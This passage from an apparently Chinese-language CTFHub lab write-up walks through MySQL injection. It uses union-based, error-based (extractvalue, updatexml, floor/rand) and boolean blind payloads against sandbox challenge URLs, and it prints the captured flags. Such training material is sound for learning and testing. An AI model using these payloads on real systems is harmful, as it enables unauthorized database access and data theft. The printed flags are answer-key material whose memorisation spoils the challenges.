data-src=\"https://img-blog.csdnimg.cn/b0b8e47da2504f08b04da122e95cb45a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/01c786bfabcd4623859f9d64125076a6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 爆字段名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/c5ba35c2e20149c2810003cf795d7643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 爆字段内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27; union select 1,(select flag from flag)#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/6a3b1f272e4c49e0af328633b3c7d442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;2344541100a643d991af8fbb&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"3报错注入\"><a class=\"anchor\" href=\"#3报错注入\">#</a> 3. 报错注入</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/dd72b915de8547af88c17386648a51e5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/ef6ba63c0e6d4c0ea1a32331e723f774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 判断注入</p>\n<p>当场景中仅仅将 SQL 语句带入查询返回页面正确，没有返回点的时候，需要报错注入，用报错的回显。<br>\n<strong>三种方法 extractvalue () updatexml () floor ()</strong></p>\n<h4 id=\"1extractvalue报错注入0x7e就是~用来区分数据\"><a class=\"anchor\" href=\"#1extractvalue报错注入0x7e就是~用来区分数据\">#</a> (1) extractvalue 报错注入：0x7e 就是～用来区分数据</h4>\n<p>里面用 select 语句，不能用 union select</p>\n<p><strong>concat () 函数</strong><br>\n 1. 功能：将多个字符串连接成一个字符串。<br>\n2. 语法：concat (str1,str2,…)<br>\n 返回结果为连接参数产生的字符串，如果有任何一个参数为 null，则返回值为 null。<br>\n**extractvalue 报错注入语句格式:<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=2 and extractvalue(null,concat(0x7e,(sql语句),0x7e))</span><br></pre></td></tr></table></figure><br>\n 爆库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and extractvalue(null,concat(0x7e,(database()),0x7e))</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/33056efa598146d69f9217a841bfd6e4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 爆库成功，库名为 sqli, 爆表<br>\n limit 0,1 爆破第一个表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/93f1ce9d62e04ba48bb26e3d4aaec21b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\nlimit 1,1 爆破第一个表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e))</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/b9f9c1d72b8c42c3aceb208bfc256a2e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 爆表成功，sqli 库中有两张表，分别是 news,flag, 接下来爆字段名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and extractvalue(null,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),0x7e))</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/71298349c70e47bab1ff33317a5c81c5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到字段名为 flag，接下来爆字段内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and extractvalue(null,concat(0x7e,(select flag from flag limit 0,1),0x7e))</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/c9d64513f462460a9f27b401cd424120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到一半 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;7ad3384c969bf4135fa1dd91</span><br></pre></td></tr></table></figure><br>\n 只显示 32 位，很明显显示的 flag 不完全，我们需要借助 mid 函数来进行字符截取从而显示 32 位以后的数据。<br>\n<strong>mid 函数</strong><br>\n<img data-src=\"https://img-blog.csdnimg.cn/45997ba2a66a4d108e0fb53fe7b36c8a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<strong> SQL MID () 语法</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select mid(column_name,start[,length]) from table_name</span><br></pre></td></tr></table></figure><br>\n<em><span class=\"exturl\" data-url=\"aHR0cDovL2NoYWxsZW5nZS03NDMzZTA4NjkxODM1MzI4LnNhbmRib3guY3RmaHViLmNvbToxMDgwMC8/aWQ9Mg==\">http://challenge-7433e08691835328.sandbox.ctfhub.com:10800/?id=2</span> and extractvalue(null,concat(0x7e,mid((select flag from flag),4),0x7e))</em><br>\n<img data-src=\"https://img-blog.csdnimg.cn/464be6d9a6a543dbbf386707ee00c50c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;848f2b393a991fa420d9457e&#125;</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/e12881dd280f41f7ab1513c42868c877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt></p>\n<h4 id=\"2updatexml报错注入\"><a class=\"anchor\" href=\"#2updatexml报错注入\">#</a> (2) updatexml 报错注入</h4>\n<p>爆库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/47252e57b8914952a910e48cae3eccad.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()),0x7e),1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/2488e50dc20b46309923f0505a22fa51.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 因为报错注入只显示一条记录，所以需要使用 limit 语句。构造的语句如下所示：<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/1301d67c530340ba814cbaecec883e8a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/b619b4eb639c440399b62fdc6ef61117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到表名为:news 和 flag，接下来爆字段名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;news&#x27;limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/565491b281ce4e0ea387959751ee54c8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/075013d4f3f44206ab9f44cb53331e47.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到 flag 表中，有一个字段名为 flag 的字段，爆字段内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and updatexml(1,concat(0x7e,(select flag from flag limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/0f77e77c932b43ffa102fb1af347d488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and updatexml(1,concat(0x7e,mid((select flag from flag),4),0x7e),1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/861545586b8f4018884e8d7ef81f7723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 使用 updatexml () 函数一样可以得到 flag</p>\n<h4 id=\"3floor报错注入\"><a class=\"anchor\" href=\"#3floor报错注入\">#</a> (3) floor 报错注入</h4>\n<h5 id=\"一-概述\"><a class=\"anchor\" href=\"#一-概述\">#</a> 一、概述</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x</span><br></pre></td></tr></table></figure><br>\n 导致数据库报错，通过 concat 函数连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。</p>\n<h5 id=\"二-函数理解\"><a class=\"anchor\" href=\"#二-函数理解\">#</a> 二、函数理解</h5>\n<p>打开 MYSQL 终端，创建数据库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create database test1;</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/27459faed51d4305bb8411dc5f1f1ee4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 建表，设置两个字段<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use test1;</span><br></pre></td></tr></table></figure><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table cze(id int unsigned not null primary key auto_increment,</span><br><span class=\"line\">name varchar(15) not null);</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/a742c50818324ae49dd6da39236e713e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 插入数据<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into cze(id,name) value(1,&#x27;chenzishuo&#x27;);</span><br><span class=\"line\">insert into cze(id,name) value(2,&#x27;zhangsan&#x27;);</span><br><span class=\"line\">insert into cze(id,name) value(3,&#x27;lisi&#x27;);</span><br><span class=\"line\">insert into cze(id,name) value(4,&#x27;wangwu&#x27;);</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/f3fa62f3d138452b8317ad80bee79061.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<strong>・rand () 函数</strong><br>\n rand () 可以产生一个在 0 和 1 之间的随机数<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select rand();</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/41a9859b42de46bfb79af0bc81e42406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 很明显，直接使用 rand 函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子 0 之后，每次产生的值都是相同的，这也可以称之为伪随机。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/a786f36f979b4422bf5dd6c9309b578f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<strong>floor(rand(0)<em> 2) 函数</em></strong><br>\n floor 函数的作用就是返回小于等于括号内该值的最大整数。<br>\nrand () 本身是返回 0<sub>1 的随机数，但在后面扩大 2 倍就返回 0</sub>2 之间的随机数。<br>\n配合上 floor 函数就可以产生确定的两个数，即 0 和 1 并且结合固定的随机种子 0，它每次产生的随机数列都是相同的值。<br>\n结合上述的函数，每次产生的随机数列都是 0 1 1 0<br>\n<img data-src=\"https://img-blog.csdnimg.cn/5b01d0e9151c41609ec7161d4b546146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n·<strong>group by 函数</strong><br>\n group by 函数，作用就是分类汇总。<br>\n重命名 id 为 a,name 为 x<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select id a,name x from cze;</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/597415b52b5c49d9929f9e794c2cab92.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 使用 group by 函数进行分组，并且按照 x (name) 进行排序。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select id a,name x from cze group by x;</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/5b64047cb9c244b8b44007ffc10e1570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n·<strong>count (*) 函数</strong><br>\n count (<em>) 函数作用为统计结果的记录数。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select name x,count(*) from cze group by id;</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/1390a0954e73471e8e0b9768e094769e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 因为这里的 x 就是 name 的数量，只有一个 count (</em>) 都为 1 了。<br>\n<strong>综合使用产生报错</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*),floor(rand(0)*2) x from cze group by x;</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/ea08dc6aec2042b4b499ee136f8ebe21.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 根据前面的函数，这句话是统计后面的 floor (raand (0)*2) from cze 产生的随机数种类并计算数量，0110, 结果是两个，但是最后却报错。</p>\n<h5 id=\"实战注入\"><a class=\"anchor\" href=\"#实战注入\">#</a> 实战注入</h5>\n<p><strong>1. 判断是否存在报错注入</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://challenge-a8c4fcd7a6890e16.sandbox.ctfhub.com:10800/?id=1 union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/abadca40f0d548579b95ba9f90e98bb9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<strong>2. 很明显存在报错注入，爆库</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/877e206e717048cda6dbdbc2ff148148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<strong>3. 得到库名为 sqli，爆表</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 union select count(*),concat(floor(rand(0)*2),(select concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 0,1)) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/e4830de9baa440f7834af38d4fd741e6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到第一个表:news, 继续爆第二个表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 union select count(*),concat(floor(rand(0)*2),(select concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 1,1)) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/a2d59ac0a7bd4f68ae5372dfc8baeb39.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<strong>4. 得到第二个表名为 flag 的表，爆字段名</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://challenge-a8c4fcd7a6890e16.sandbox.ctfhub.com:10800/?id=1 union select count(*),concat(floor(rand(0)*2),(select concat(column_name) from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27; limit 0,1)) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/f8c52ff97cdd4b21bd9611c85b2b281d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<strong>5. 得到字段名为 flag，爆字段内容</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://challenge-a8c4fcd7a6890e16.sandbox.ctfhub.com:10800/?id=1 union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(flag) from sqli.flag limit 0,1)) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/9481c9b4392e48d19debe78bce457d13.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;cc0250d9abf7bcf88534984b&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"4盲注\"><a class=\"anchor\" href=\"#4盲注\">#</a> 4. 盲注</h3>\n<p>盲注其实是 SQL 注入的一种，之所以成为盲注是因为他不会根据你 SQL 注入的攻击语句返回你想要知道的错误信息。</p>\n<h4 id=\"1布尔盲注\"><a class=\"anchor\" href=\"#1布尔盲注\">#</a> (1) 布尔盲注</h4>\n<p>布尔盲注只会回显 True 和 False 两种情况。<br>\nlength () 返回字符串的长度<br>\n substr () 截取字符串<br>\n ascii () 返回字符串的 ASCII 码<br>\n<strong>获取数据库的长度</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select length(database()))&gt;=长度    //可以通过大于等于来进行猜测数据库的长度</span><br></pre></td></tr></table></figure><br>\n<strong> 逐字猜解数据库名</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select ascii(substr(database(),位数，1)))=ASCII码  //位数的变化即通过ASCII码以及猜解的数据长度求出数据库的库名</span><br></pre></td></tr></table></figure><br>\n<strong> 猜解某个表的长度</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度</span><br><span class=\"line\">//同理n从0来表示变化的表来求该库下的对应的表的长度</span><br></pre></td></tr></table></figure><br>\n<strong> 逐位猜解表名</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit n,1)=ascii码 #从前面的1变化是求表名，而n变化是对应的库中的表</span><br></pre></td></tr></table></figure><br>\n<strong> 猜解列名数量</strong><br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select count(*) from information_schema.columns where table_schema=database() and table_name = 表名)=数量</span><br><span class=\"line\">#information_schema.columns     